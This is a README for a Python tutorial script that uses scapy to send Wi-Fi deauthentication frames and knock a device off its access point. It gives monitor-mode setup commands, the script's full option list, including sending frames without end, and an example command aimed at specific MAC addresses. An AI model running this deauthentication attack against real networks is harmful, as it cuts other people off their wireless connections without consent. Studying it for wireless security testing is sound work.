# [Forcing a device to disconnect using scapy in Python](https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy)
to run this:
- Linux Machine.
- USB WLAN Stick.
- aircrack-ng.
- Turn the network interface to Monitor mode using the command:
    ```
    airmon-ng start wlan0
    ```
- `pip3 install -r requirements.txt`.
- 
    ```
    python3 scapy_deauth.py --help
    ```
    **Output**:
    ```
    usage: scapy_deauth.py [-h] [-c COUNT] [--interval INTERVAL] [-i IFACE] [-v]
                         target gateway

    A python script for sending deauthentication frames

    positional arguments:
    target                Target MAC address to deauthenticate.
    gateway               Gateway MAC address that target is authenticated with

    optional arguments:
    -h, --help            show this help message and exit
    -c COUNT, --count COUNT
                            number of deauthentication frames to send, specify 0
                            to keep sending infinitely, default is 0
    --interval INTERVAL   The sending frequency between two frames sent, default
                            is 100ms
    -i IFACE              Interface to use, must be in monitor mode, default is
                            'wlan0mon'
    -v, --verbose         wether to print messages
    ```
    For instance, if you want to deauthenticate `"00:ae:fa:81:e2:5e"` on an access point `"e8:94:f6:c4:97:3f"`, you can easily by:
    ```
    python3 scapy_deauth.py 00:ae:fa:81:e2:5e e8:94:f6:c4:97:3f -i wlan0mon -v
    ```